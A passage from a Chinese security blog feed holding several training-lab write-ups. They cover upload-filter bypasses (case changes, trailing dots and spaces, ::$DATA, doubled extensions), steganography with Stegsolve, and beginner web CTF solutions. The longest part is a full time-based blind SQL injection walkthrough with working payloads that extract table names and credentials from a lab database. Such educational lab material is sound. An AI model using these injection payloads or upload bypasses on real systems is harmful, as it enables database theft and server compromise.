<p><img src="https://img-blog.csdnimg.cn/20210419192248867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>放包<img src="https://img-blog.csdnimg.cn/20210419192327426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到<code>.pHP</code>不可以🤦‍♂️换<code>.pHP . .</code> 试试<br><img src="https://img-blog.csdnimg.cn/20210419193349747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>放包，返回查看<br><img src="https://img-blog.csdnimg.cn/20210419193425222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功了！！👀👀👀👀</p>
<h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><p><img src="https://img-blog.csdnimg.cn/20210419194004849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2021041919395472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到这一关与第五关相差不大，与上面的方法一样进行尝试吧，这里我们先使用与第五关相同的后缀进行绕过：<code>.pHP </code><br><img src="https://img-blog.csdnimg.cn/20210419194755608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419194241896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功！</p>
<h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><p><img src="https://img-blog.csdnimg.cn/20210419194957902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210419194946635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这一关嘛，和前几关还是有点相似，既然对后缀的点和空格都有过滤，那么这一关我们使用<code>（点+空格+点）</code> 达到过滤的目的<img src="https://img-blog.csdnimg.cn/20210419200140436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419200153695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><p><img src="https://img-blog.csdnimg.cn/20210419201100291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>既然本题禁止上传可以解析的后缀，那么我们将后缀改成<code>.php.</code>然后进行放包就可以了<img src="https://img-blog.csdnimg.cn/20210419202042665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419202145970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功！🐱‍🐉🐱‍🐉</p>
<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p><img src="https://img-blog.csdnimg.cn/20210419202254158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里使用<code>::$DATA绕过</code><br>看一下大佬的说明<img src="https://img-blog.csdnimg.cn/20210419202717302.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210419202928768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210419202943958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功了</p>
<h1 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h1><p><img src="https://img-blog.csdnimg.cn/2021041920302314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>和第五关真的是相差不大吧，就过去了</p>
<h1 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h1><p><img src="https://img-blog.csdnimg.cn/20210419203916211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419203929662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里使用了替换函数，因此可以使用双写后缀进行绕过<img src="https://img-blog.csdnimg.cn/20210419204116741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2021041920432455.png" alt="在这里插入图片描述"><br>上传成功！</p>
]]></content>
  </entry>
  <entry>
    <title>图片隐写（二）</title>
    <url>/2021/06/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="一-jpg"><a href="#一-jpg" class="headerlink" title="一.jpg"></a>一.jpg</h1><p>一切隐藏的事物无外乎依附于一个载体，从而达到加密的效果。因此当我们分析时需要充分了解载体，了解载体本身哪里可以隐藏。也就是说当面对图片隐写时，我们需要充分了解图片格式，比如在图片中的exif信息里面包含很多东西同时也可以进行修改，通过查看属性就可以发现。</p>
<p>当我们查看本题：小黄人能有什么坏心思呢？<br><img src="https://img-blog.csdnimg.cn/20210319195111600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>：<img src="https://img-blog.csdnimg.cn/20210319195222315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>哇哦，flag出来了！<br>因此在查看图片的时候一定要发现所隐藏的载体在哪里从而进行判断。</p>
<h1 id="二、LSB"><a href="#二、LSB" class="headerlink" title="二、LSB"></a>二、LSB</h1><p>LSB也就是最低有效位 ,原理就是图片中的像数一般是由<strong>三种颜色</strong>组成，即<strong>三原色</strong>，由<strong>这三种原色可以组成其他各种颜色</strong>，例如在PNG图片的储存中，每个颜色会有 8bit，LSB隐写就是<strong>修改了像数中的最低的1bit</strong>，在人眼看来是看不出来区别的，也把信息隐藏起来了<br><img src="https://img-blog.csdnimg.cn/20210319204057456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>针对LSB这类的题目同样有一个神器：<strong>Stegsolve</strong><br>打开之后进行分析即可：<img src="https://img-blog.csdnimg.cn/20210319204244780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210319204253248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210319204305576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到了什么？一个二维码继续！<img src="https://img-blog.csdnimg.cn/20210319204337909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210319204638428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到了flag<br>如果隐写使用了ascii的话，可以使用Stegsolve——Analyse——Data Extract来查看ascii码。</p>
]]></content>
  </entry>
  <entry>
    <title>延时注入-sql注入第九关</title>
    <url>/2021/06/05/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5-sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B9%9D%E5%85%B3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2>什么是延时注入？</h2>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>IF(<span class="hljs-keyword">Condition</span>,A,B)函数<br><span class="hljs-number">2.</span>当<span class="hljs-keyword">Condition</span>为<span class="hljs-literal">TRUE</span>时，返回A；当<span class="hljs-keyword">Condition</span>为<span class="hljs-literal">FALSE</span>时，返回B。<br><span class="hljs-number">3.</span>sleep()函数			网页延迟n秒后，输出结果<br><span class="hljs-number">4.</span><span class="hljs-keyword">left</span>（）函数           左边数，取几个数<br></code></pre></td></tr></table></figure>
<p>比如呢：</p>
<ul>
<li>判断当前数据库长度:<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">3</span><span class="hljs-string">&#x27; and if(length(database())&gt;10,sleep(5),1) --+  #判断数据库长度</span><br></code></pre></td></tr></table></figure></li>
<li>获取当前连接数据库第一个字母<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">if(ascii(substr((<span class="hljs-keyword">select</span> database()), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure></li>
<li>判断第一个数据库第一个字符。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">if(ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> table_schema <span class="hljs-keyword">from</span> information_schema.tables limit <span class="hljs-number">0</span>, <span class="hljs-number">1</span>), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">105</span>,sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
<h1 id="一、判断注入点"><a href="#一、判断注入点" class="headerlink" title="一、判断注入点"></a>一、判断注入点</h1><p><strong>延时注入其实也就是利用响应时长发生延迟从而判断返回值是否正确，当然最麻烦的是页面不论报不报错，都不会返回错误</strong></p>
<p>该关其实是基于是否闭合的字符型注入，展示！<br><strong>闭合型：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and (sleep(2)) --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210416195656407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一般正常页面响应的时间也就是延迟两秒左右，说明不是闭合型注入<br><strong>不闭合型：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (sleep(2)) --+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210416195807429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在这里我们设置的延迟响应为2s可以看到页面延迟响应为4s左右说明，找到了注入点</p>
<h1 id="二、爆数据库"><a href="#二、爆数据库" class="headerlink" title="二、爆数据库"></a>二、爆数据库</h1><p>接下来的解题思想和第八关相差不大，数据库（security）的长度为8我想大家做到这一关应该都知道了(●’◡’●)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if (length(database())=8,sleep(2),1) --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210416201250322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到延时响应了2s说明数据库的长度就是8！！！<br><strong>爆数据</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))=115,sleep(2),1) --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210416201659577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>第一位ASCII值为115，为</strong><code>s</code><br><strong>第二位</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),2,1))=101,sleep(2),1) --+</span><br></code></pre></td></tr></table></figure>
<p>就这样依次往下，更换第一位的大小依次往下求值得到数据库的名字：security.</p>
<h1 id="三、爆表名"><a href="#三、爆表名" class="headerlink" title="三、爆表名"></a>三、爆表名</h1><p>原理和上面的是一样的<br>第一位：ASCII值为117-（u）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and If(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; limit 3,1),1,1))=117,sleep(2),1)--+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021041620274042.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>第二位：ASCII值为115-（s）</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and If(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; limit 3,1),2,1))=115,sleep(2),1)--+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210416202855187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就这样依次往下吧最后得到：emails/users</p>
<h1 id="四、爆字段"><a href="#四、爆字段" class="headerlink" title="四、爆字段"></a>四、爆字段</h1><p><strong>第一个字：ASCII=105-(i)</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and If(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and table_schema=database() limit 0,1),1,1))=105,sleep(2),1)--+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210416203129699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来只需要修改下面红标的值就可以了<br><img src="https://img-blog.csdnimg.cn/20210416203236910.png" alt="在这里插入图片描述"><br><strong>第二个字：ASCII=100-(d)</strong><br><img src="https://img-blog.csdnimg.cn/20210416203430336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>可见第一列列名：id</strong></p>
<p><strong>第二列第一个字：ASCII=117-(u)</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and If(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and table_schema=database() limit 1,1),1,1))=117,sleep(2),1)--+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210416203710870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>换列只需要更换第一个数字的大小，0为第一列，1为第二列，接下来求第二列的字段也就像求第一列的字段一样操作<br><img src="https://img-blog.csdnimg.cn/20210416203755461.png" alt="在这里插入图片描述"><br>第二个字：ASCII=115-(s)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and If(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and table_schema=database() limit 1,1),2,1))=115,sleep(2),1)--+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210416204037189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还是这样依次往下吧😎得到列为分别为:<br><strong>第一列名：id<br>第二列名：username<br>第三列名：password</strong></p>
<h1 id="五、爆数据"><a href="#五、爆数据" class="headerlink" title="五、爆数据"></a>五、爆数据</h1><p>曙光来了🤳让我们来看看username藏了什么吧<br><strong>第一个ASCII=68-(D)</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and If(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(2),1)--+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210416204522869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>第二个字：ASCII=117-(u)</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and If(ascii(substr((select username from users limit 0,1),2,1))=117,sleep(2),1)--+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210416204715663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>就这样依次往下继续吧🤞<br>最后依次进行得到<strong>username:Dumb,password:Dumb</strong></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简而言之呢，其实延时注入格式也是固定的理解<strong>sleep(x)</strong> 函数的意义是关键，不过就是个自行设定如果判断成功那么就会延迟x秒嘛🐱‍🚀</p>
]]></content>
  </entry>
  <entry>
    <title>攻防世界-新手区Wbe题</title>
    <url>/2021/06/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web(%E6%96%B0%E6%89%8B%E5%8C%BA)%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这里记录了我对于学习攻防世界-新手区Wbe题的总结。</p>
<h1 id="一、view-source"><a href="#一、view-source" class="headerlink" title="一、view_source"></a>一、view_source</h1><p><img src="https://img-blog.csdnimg.cn/20210221160121973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>该题通过提示可以看出需要查看网页源代码，但是采用右键的方式无法使用因此可以使用F12进行查看。<br><img src="https://img-blog.csdnimg.cn/20210221160253865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="二、robots"><a href="#二、robots" class="headerlink" title="二、robots"></a>二、robots</h1><p><img src="https://img-blog.csdnimg.cn/20210221160942365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>该题的关键是<code>robots</code>,通过查阅发现：<br>robots协议即为：robots.txt<img src="https://img-blog.csdnimg.cn/20210221161236660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此需要在url后添加：robots.txt<br><img src="https://img-blog.csdnimg.cn/20210221161327354.png" alt="在这里插入图片描述"><br>根据提示将添加内容改为：f1ag_1s_h3re.php得到flag<br><img src="https://img-blog.csdnimg.cn/20210221161759916.png" alt="在这里插入图片描述"></p>
<h1 id="三-backup"><a href="#三-backup" class="headerlink" title="三.backup"></a>三.backup</h1><p><img src="https://img-blog.csdnimg.cn/20210221161918336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目场景<img src="https://img-blog.csdnimg.cn/20210221162219661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个…需要上网查阅：<br> 常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” 尝试在URL后面，依次输入常见的文件备份扩展名。</p>
<p>  当输入.bak即<code>http://111.200.241.244:40794/index.php.bak</code>后会下载一个文件打开文件得到flag<img src="https://img-blog.csdnimg.cn/20210221162603220.png" alt="在这里插入图片描述"></p>
<h1 id="四-cookie"><a href="#四-cookie" class="headerlink" title="四.cookie"></a>四.cookie</h1><p><img src="https://img-blog.csdnimg.cn/20210221162727825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>了解一下：<img src="https://img-blog.csdnimg.cn/20210222145945679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开后无任何提示，我们这里用Burp就行抓包<br><img src="https://img-blog.csdnimg.cn/20210222151103745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>URL后中打开cookie.php<br><img src="https://img-blog.csdnimg.cn/20210222151309804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>打开开发者模式进行查看响应头得到flag：<br><img src="https://img-blog.csdnimg.cn/20210222151556220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
